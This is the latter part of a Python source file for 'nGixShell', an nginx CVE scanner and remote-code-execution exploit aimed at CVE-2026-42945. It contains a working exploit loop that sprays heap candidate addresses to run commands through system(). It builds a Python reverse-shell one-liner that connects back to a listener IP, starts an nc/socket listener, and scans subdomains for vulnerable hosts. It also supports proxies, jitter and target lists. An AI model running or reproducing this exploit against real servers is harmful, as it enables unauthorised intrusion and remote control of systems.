        futures = {}
        for sub in wordlist:
            if _rate_limiter: _rate_limiter.acquire()
            futures[ex.submit(_probe_subdomain, f"{sub}.{domain}", port, tls, proxy, timeout)] = sub
        for fut in as_completed(futures):
            r = fut.result()
            if r is None: continue
            tag = "[VULN]" if r["vulnerable"] else "[    ]"
            log(f"  {tag:<10} {r['host']:<42} {r['server']}")
            results.append(r)
    log("─" * 68)
    vuln = [r for r in results if r["vulnerable"]]
    log(f"[+] {len(results)} responded | {len(vuln)} potentially vulnerable")
    if vuln:
        log("\n[!] Potentially vulnerable:")
        for r in vuln: log(f"    {r['host']}  ({r['server']})")
    return results


# ─── Reverse shell ────────────────────────────────────────────────────────────

def start_shell_listener(port: int) -> threading.Thread:
    import subprocess

    def _sock():
        log(f"[*] Built-in listener on :{port}")
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(1)
        try:
            conn, addr = srv.accept()
            log(f"[+] Shell from {addr[0]}:{addr[1]}")
            while True:
                r, _, _ = select.select([conn, sys.stdin], [], [], 1.0)
                if conn in r:
                    data = conn.recv(4096)
                    if not data: break
                    sys.stdout.write(data.decode("utf-8", errors="replace"))
                    sys.stdout.flush()
                if sys.stdin in r:
                    line = sys.stdin.readline()
                    if not line: break
                    conn.sendall(line.encode())
        except Exception as e:
            vlog(f"[v] Listener: {e}")
        finally:
            srv.close()

    def _run():
        try:    __import__("subprocess").run(["nc", "-l", "-p", str(port)], check=True)
        except FileNotFoundError: _sock()
        except Exception as e:   vlog(f"[v] nc: {e}")

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    return t


# ─── Output helpers ───────────────────────────────────────────────────────────

_SEV_COLOR    = {"CRITICAL": "#ff4444", "HIGH": "#ff8800", "MEDIUM": "#ffcc00", "LOW": "#88cc00"}
_STATUS_COLOR = {
    "VULNERABLE": "#ff4444", "EXPLOIT-AVAIL": "#ff6600",
    "VERSION-MATCH": "#ffaa00", "UNKNOWN": "#888888",
    "PATCHED": "#44aa44", "PROBE-CLEAN": "#44aa44", "LOCAL-ONLY": "#6688aa",
}


def generate_html_report(host, port, findings, fingerprint=None,
                         elapsed=0.0, path="ngixshell_report.html"):
    ts   = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    rows = ""
    for cve_id, info, status in findings:
        sc = _STATUS_COLOR.get(status, "#888")
        vc = _SEV_COLOR.get(info["severity"], "#888")
        rows += (f"<tr><td><a href='{info.get('ref','')}' style='color:#58a6ff'>{cve_id}</a></td>"
                 f"<td style='color:{vc}'>{info['cvss']} {info['severity']}</td>"
                 f"<td style='color:{sc};font-weight:bold'>{status}</td>"
                 f"<td>{info['description']}</td>"
                 f"<td>{info['fixed_in']}</td></tr>\n")
    fp_html = ""
    if fingerprint:
        fp_html = "<h2>Fingerprint</h2><table>"
        for k, v in fingerprint.items():
            if k == "version_tuple": continue
            fp_html += f"<tr><td style='color:#8b949e;padding-right:16px'>{k}</td><td>{v}</td></tr>"
        fp_html += "</table>"

    with open(path, "w", encoding="utf-8") as f:
        f.write(f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>nGixShell — {host}:{port}</title>
<style>body{{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;padding:24px;margin:0}}
h1{{color:#00e676;letter-spacing:2px}}h2{{color:#58a6ff;margin-top:28px}}
table{{border-collapse:collapse;width:100%;margin-top:12px}}
th{{background:#161b22;color:#8b949e;text-align:left;padding:8px 12px;border-bottom:1px solid #30363d}}
td{{padding:7px 12px;border-bottom:1px solid #21262d;vertical-align:top}}
tr:hover td{{background:#161b22}}.meta{{color:#8b949e;margin-bottom:24px;font-size:13px}}</style>
</head><body>
<h1>nGixShell — CVE Scan Report</h1>
<div class="meta">Target: <strong>{host}:{port}</strong> &nbsp;|&nbsp;
Generated: {ts} &nbsp;|&nbsp; Elapsed: {elapsed:.1f}s &nbsp;|&nbsp; Findings: {len(findings)}</div>
{fp_html}
<h2>CVE Findings</h2>
<table><tr><th>CVE</th><th>CVSS / Severity</th><th>Status</th><th>Description</th><th>Fixed In</th></tr>
{rows or '<tr><td colspan="5" style="color:#44aa44">No issues detected.</td></tr>'}
</table></body></html>""")
    log(f"[+] HTML report: {path}")


def _build_json_output(host, port, findings, fingerprint=None, elapsed=0.0):
    out = {
        "tool":      "nGixShell",
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
        "target":    {"host": host, "port": port},
        "elapsed_s": round(elapsed, 2),
        "findings":  [],
    }
    if fingerprint:
        out["fingerprint"] = {k: v for k, v in fingerprint.items() if k != "version_tuple"}
    for cve_id, info, status in findings:
        out["findings"].append({
            "cve": cve_id, "cvss": info["cvss"], "severity": info["severity"],
            "status": status, "description": info["description"],
            "fixed_in": info["fixed_in"], "ref": info.get("ref", ""),
        })
    return out


# ─── Entry point ──────────────────────────────────────────────────────────────

def main() -> int:
    global _verbose, _tmul, _log_fh, _user_agent, _extra_headers
    global _jitter_ms, _retry_count, _rate_limiter

    parser = argparse.ArgumentParser(
        prog="ngixshell.py",
        description="nGixShell — nginx CVE scanner + RCE exploit (auto mode by default)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Usage examples
──────────────
  Scan a target (auto mode — fingerprint + all CVEs + report):
    ngixshell.py 127.0.0.1:19321
    ngixshell.py https://192.168.1.10

  Exploit (RCE):
    ngixshell.py 127.0.0.1:19321 --cmd 'id'
    ngixshell.py 127.0.0.1:19321 --shell --listen-ip 10.0.0.1 --listen-port 4444

  Subdomain scan:
    ngixshell.py --subdomain-scan example.com --scan-port 443

  Multiple targets from file:
    ngixshell.py --target-file hosts.txt

  List CVE database:
    ngixshell.py --list-cves

  With proxy / auth / custom headers:
    ngixshell.py 127.0.0.1 --proxy socks5://127.0.0.1:9050
    ngixshell.py 127.0.0.1 --auth admin:pass --header "X-Token: abc"
""",
    )

    # ── Target (positional, optional) ────────────────────────────────────────
    parser.add_argument("target", nargs="?", default=None,
                        metavar="TARGET",
                        help="host, host:port, http://host:port, https://host:port "
                             "(default: 127.0.0.1:19321)")

    # ── Exploit flags ─────────────────────────────────────────────────────────
    exploit = parser.add_argument_group("exploit (CVE-2026-42945)")
    exploit.add_argument("--cmd",      metavar="CMD",  help="command to execute via RCE")
    exploit.add_argument("--cmd-file", metavar="FILE", help="file with commands (one per line)")
    exploit.add_argument("--shell",    action="store_true", help="pop a reverse shell")

    # ── Special modes ─────────────────────────────────────────────────────────
    special = parser.add_argument_group("special modes")
    special.add_argument("--subdomain-scan",  metavar="DOMAIN",
                         help="scan subdomains of DOMAIN for vulnerable nginx")
    special.add_argument("--cve",             metavar="CVE-ID",
                         help="test one specific CVE (e.g. CVE-2017-7529)")
    special.add_argument("--list-cves",       action="store_true",
                         help="print CVE database and exit")
    special.add_argument("--list-candidates", action="store_true",
                         help="print heap candidates and exit")
    special.add_argument("--dry-run",         action="store_true",
                         help="fingerprint + CVE scan only, skip exploit")
    special.add_argument("--target-file",     metavar="FILE",
                         help="file with host[:port] targets (one per line)")

    # ── Connection options ────────────────────────────────────────────────────
    conn = parser.add_argument_group("connection")
    conn.add_argument("--port",  type=int, default=None,
                      help="override port (useful when TARGET has no port)")
    conn.add_argument("--tls",   action="store_true",
                      help="force TLS (auto-detected by default)")
    conn.add_argument("--proxy", metavar="URL",
                      help="proxy: http://, https://, socks5://")

    # ── HTTP options ──────────────────────────────────────────────────────────
    http = parser.add_argument_group("http")
    http.add_argument("--user-agent", metavar="UA", default="nGixShell/1.0")
    http.add_argument("--auth",       metavar="USER:PASS",
                      help="HTTP Basic auth")
    http.add_argument("--cookie",     metavar="VALUE")
    http.add_argument("--header",     metavar="NAME:VALUE", action="append", default=[],
                      help="extra header (repeatable)")

    # ── Rate / timing ─────────────────────────────────────────────────────────
    rate = parser.add_argument_group("rate / timing")
    rate.add_argument("--jitter",     type=float, default=0.0, metavar="MS",
                      help="random delay 0–MS ms between requests")
    rate.add_argument("--rate-limit", type=float, default=0.0, metavar="RPS",
                      help="max requests/sec (0 = unlimited)")
    rate.add_argument("--retry",      type=int,   default=1,
                      help="probe retries on inconclusive result (default: 1)")
    rate.add_argument("--timeout-multiplier", type=float, default=1.0, metavar="X",
                      help="scale all sleep timings (default: 1.0)")

    # ── Reverse shell ─────────────────────────────────────────────────────────
    rsh = parser.add_argument_group("reverse shell")
    rsh.add_argument("--listen-port", type=int, default=1337)
    rsh.add_argument("--listen-ip",   default="172.17.0.1")

    # ── Exploit tuning ────────────────────────────────────────────────────────
    tuning = parser.add_argument_group("exploit tuning")
    tuning.add_argument("--tries",    type=int,   default=10)
    tuning.add_argument("--spray",    type=int,   default=20)
    tuning.add_argument("--body-len", type=int,   default=4000)

    # ── Subdomain scan ────────────────────────────────────────────────────────
    sd = parser.add_argument_group("subdomain scan")
    sd.add_argument("--wordlist",     metavar="FILE")
    sd.add_argument("--scan-port",    type=int,   default=80)
    sd.add_argument("--scan-tls",     action="store_true")
    sd.add_argument("--scan-threads", type=int,   default=20)
    sd.add_argument("--scan-timeout", type=float, default=5.0)

    # ── Output ────────────────────────────────────────────────────────────────
    out = parser.add_argument_group("output")
    out.add_argument("--output",      metavar="FILE",
                     help="write log to FILE in addition to stdout")
    out.add_argument("--json",        action="store_true",
                     help="print JSON summary")
    out.add_argument("--html-report", metavar="FILE", nargs="?",
                     const="ngixshell_report.html",
                     help="save HTML report (default: ngixshell_report.html)")
    out.add_argument("--no-report",   action="store_true",
                     help="skip the auto HTML report in auto mode")
    out.add_argument("--verbose",     action="store_true")

    args = parser.parse_args()

    print(BANNER)

    # Quick-exit modes that need no target
    if args.list_cves:
        list_cves()
        return 0
    if args.list_candidates:
        list_candidates()
        return 0

    # Validate --cve
    if args.cve and args.cve not in CVE_DB:
        parser.error(f"Unknown CVE '{args.cve}'. Use --list-cves to see IDs.")

    # Apply globals
    _verbose     = args.verbose
    _tmul        = args.timeout_multiplier
    _user_agent  = args.user_agent
    _jitter_ms   = args.jitter
    _retry_count = args.retry
    if args.rate_limit > 0:
        _rate_limiter = RateLimiter(args.rate_limit)
    if args.auth:
        _extra_headers["Authorization"] = "Basic " + base64.b64encode(args.auth.encode()).decode()
    if args.cookie:
        _extra_headers["Cookie"] = args.cookie
    for hdr in args.header:
        if ":" in hdr:
            k, _, v = hdr.partition(":")
            _extra_headers[k.strip()] = v.strip()
    if args.output:
        _log_fh = open(args.output, "w", encoding="utf-8")

    start = time.monotonic()

    try:
        # ── Subdomain scan (no single target needed) ──────────────────────────
        if args.subdomain_scan:
            if args.wordlist:
                with open(args.wordlist) as f:
                    wordlist = [l.strip() for l in f if l.strip()]
            else:
                wordlist = COMMON_SUBDOMAINS
            subdomain_scan(args.subdomain_scan, wordlist,
                           port=args.scan_port, tls=args.scan_tls,
                           proxy=args.proxy, n_threads=args.scan_threads,
                           timeout=args.scan_timeout)
            return 0

        # ── Build target list ──────────────────────────────────────────────────
        raw_targets = []
        if args.target_file:
            with open(args.target_file) as f:
                for line in f:
                    h, p, tls_f = _parse_target_line(line, args.port or 19321)
                    if h:
                        raw_targets.append((h, p, tls_f))
            if not raw_targets:
                log("[!] target-file has no valid entries")
                return 1
        else:
            tstr = args.target or "127.0.0.1:19321"
            h, p, tls_f = parse_target(tstr, args.port or 19321)
            if args.port:
                p = args.port
            raw_targets = [(h, p, tls_f)]

        all_findings     = []
        all_fingerprints = []

        for t_host, t_port, tls_forced in raw_targets:
            if len(raw_targets) > 1:
                log(f"\n{'━'*60}  {t_host}:{t_port}  {'━'*60}")

            # TLS resolution order: explicit --tls > scheme (https://) > auto-detect
            use_tls = args.tls or tls_forced
            if not use_tls:
                log(f"[*] Auto-detecting TLS for {t_host}:{t_port} ...")
                use_tls = _auto_detect_tls(t_host, t_port, args.proxy)
                log(f"[*] TLS: {'yes' if use_tls else 'no'}")

            # ── Exploit modes ─────────────────────────────────────────────────
            exploit_mode = args.cmd or args.cmd_file or args.shell
            if exploit_mode and not args.dry_run:
                if args.cmd_file:
                    with open(args.cmd_file) as f:
                        cmds = [l.strip() for l in f if l.strip()]
                    cmd = "; ".join(cmds)
                    log(f"[*] Loaded {len(cmds)} commands from {args.cmd_file}")
                elif args.shell:
                    cmd = (
                        f"python3 -c 'import socket,subprocess,os;"
                        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                        f"s.connect((\"{args.listen_ip}\",{args.listen_port}));"
                        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                        f"subprocess.call([\"/bin/sh\",\"-i\"])'"
                    )
                else:
                    cmd = args.cmd

                if args.shell:
                    log(f"[*] Listening on :{args.listen_port} ...")
                    start_shell_listener(args.listen_port)
                    _sleep(1)

                candidates = get_candidates()
                if not candidates:
                    log("[!] No safe heap candidates.")
                    return 1
                log(f"[*] {len(candidates)} safe candidates")

                primary_addr = candidates[0][1]
                data_addr    = primary_addr + FAKE_STRUCT_SIZE
                body         = make_body(cmd, data_addr, args.body_len)

                log(f"[*] Waiting for nginx ...")
                if not wait_alive(t_host, t_port, tls=use_tls, proxy=args.proxy):
                    log("[!] nginx not responding")
                    return 1
                log("[+] Connected.")

                success = winner_addr = winner_try = None
                total_attempts = candidates_tried = 0

                for ci, (_, addr) in enumerate(candidates):
                    target_b = bytes([(addr >> (j * 8)) & 0xff for j in range(6)])
                    candidates_tried += 1
                    for an in range(args.tries):
                        total_attempts += 1
                        log(f"  [cand {ci+1}/{len(candidates)}] [try {an+1}/{args.tries}] "
                            f"0x{addr:012x}")
                        if not wait_alive(t_host, t_port, timeout=10,
                                          tls=use_tls, proxy=args.proxy):
                            _sleep(2)
                            if not wait_alive(t_host, t_port, timeout=10,
                                              tls=use_tls, proxy=args.proxy):
                                log("    server not recovering, aborting")
                                return 1
                        if attempt(t_host, t_port, target_b, body,
                                   args.spray, args.body_len, use_tls, args.proxy):
                            success     = True
                            winner_addr = addr
                            winner_try  = an + 1
                            if args.shell:
                                log("[+] Crash — waiting for shell (Ctrl+C to exit)...")
                                try:
                                    while True: _sleep(1)
                                except KeyboardInterrupt:
                                    pass
                            else:
                                log(f'[+] system("{cmd}") executed')
                            log("[+] Done.")
                            break
                        _sleep(0.3)
                    if success:
                        break

                if not success:
                    log("[+] All candidates tried — no crash detected.")

                elapsed = time.monotonic() - start
                log("")
                log("═" * 60)
                log("  EXPLOIT REPORT")
                log("═" * 60)
                log(f"  Target   : {t_host}:{t_port}")
                log(f"  Command  : {cmd}")
                log(f"  Result   : {'SUCCESS' if success else 'FAILURE'}")
                log(f"  Elapsed  : {elapsed:.1f}s")
                if winner_addr:
                    log(f"  Address  : 0x{winner_addr:012x}  (try {winner_try})")
                log("═" * 60)
                return 0 if success else 1

            # ── Auto / scan mode ──────────────────────────────────────────────
            fp       = fingerprint_target(t_host, t_port, use_tls, args.proxy)
            version  = fp.get("version_tuple")
            findings = cve_scan(t_host, t_port, use_tls, args.proxy,
                                target_cve=args.cve if args.cve else None,
                                version=version)

            all_findings.extend(findings)
            all_fingerprints.append(fp)

        # ── Post-loop output ──────────────────────────────────────────────────
        elapsed = time.monotonic() - start
        h0, p0  = raw_targets[0][0], raw_targets[0][1]
        fp0     = all_fingerprints[0] if all_fingerprints else None

        if args.json:
            obj = _build_json_output(h0, p0, all_findings, fp0, elapsed)
            if len(raw_targets) > 1:
                obj["all_targets"] = [{"host": h, "port": p} for h, p, _ in raw_targets]
            print(json.dumps(obj, indent=2, ensure_ascii=False))

        # Auto HTML report when findings exist (unless --no-report)
        html_path = args.html_report
        if not html_path and not args.no_report and all_findings:
            ts        = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
            html_path = f"ngixshell_{h0}_{ts}.html"

        if html_path:
            generate_html_report(h0, p0, all_findings, fp0, elapsed, html_path)

        return 0 if not all_findings else 1

    finally:
        if _log_fh:
            _log_fh.close()


if __name__ == "__main__":
    sys.exit(main())
